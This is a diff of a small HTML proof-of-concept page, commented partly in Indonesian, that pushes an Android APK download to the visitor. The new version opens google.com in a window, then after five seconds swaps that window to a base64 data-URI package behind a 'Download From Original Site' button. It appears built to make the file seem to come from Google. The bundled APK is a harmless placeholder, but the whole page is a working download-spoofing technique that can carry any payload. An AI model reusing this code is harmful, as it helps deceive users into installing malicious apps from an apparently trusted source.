@@ -1,74 +1,31 @@
-<!DOCTYPE html>
+
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Android APK Base64 Download PoC Fixed</title>
-</head>
-<body>
-
-<button id="start">Start Base64 Download</button>
-
-<script>
-document.getElementById('start').addEventListener('click', () => {
-  try {
-    // Dummy file content
-    const content = `
-PK
-Fake_APK_File
-AndroidManifest.xml
-classes.dex
-res/layout/activity_main.xml
-END_OF_FILE
-`;
-
-    // Convert string ke Uint8Array (ASCII-safe)
-    function toUint8Array(str) {
-      const arr = new Uint8Array(str.length);
-      for (let i = 0; i < str.length; i++) {
-        // pastikan byte hanya 0-255
-        arr[i] = str.charCodeAt(i) & 0xff;
-      }
-      return arr;
-    }
-
-    // Convert ke Base64 binary-safe
-    function base64Encode(uint8Array) {
-      let CHUNK_SIZE = 0x8000; // 32KB chunk
-      let index = 0;
-      let result = '';
-      const len = uint8Array.length;
-      let slice;
-      while (index < len) {
-        slice = uint8Array.subarray(index, Math.min(index + CHUNK_SIZE, len));
-        result += String.fromCharCode.apply(null, slice);
-        index += CHUNK_SIZE;
-      }
-      return btoa(result);
-    }
-
-    const uint8 = toUint8Array(content);
-    const base64 = base64Encode(uint8);
-
-    // Trigger download via <a> lebih reliable daripada location.href
-    const a = document.createElement('a');
-    a.href = 'data:application/vnd.android.package-archive;base64,' + base64;
-    a.download = 'test.apk';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-
-    console.log("Base64 APK download triggered reliably");
-
-    // Redirect setelah 500ms
-    setTimeout(() => {
-      location.href = "https://google.com";
-    }, 500);
-
-  } catch (e) {
-    console.error(e);
-  }
-});
-</script>
-
-</body>
+ <head> 
+  <meta charset="utf-8">
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+	window.open('https://google.com', 'x');
+	setTimeout(function(){
+		window.open('data:application/vnd.android.package-archive;base64,ClBLCkZha2VfQVBLX0ZpbGUKQW5kcm9pZE1hbmlmZXN0LnhtbApjbGFzc2VzLmRleApyZXMvbGF5b3V0L2FjdGl2aXR5X21haW4ueG1sCkVORF9PRl9GSUxFCg==', 'x');
+	}, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
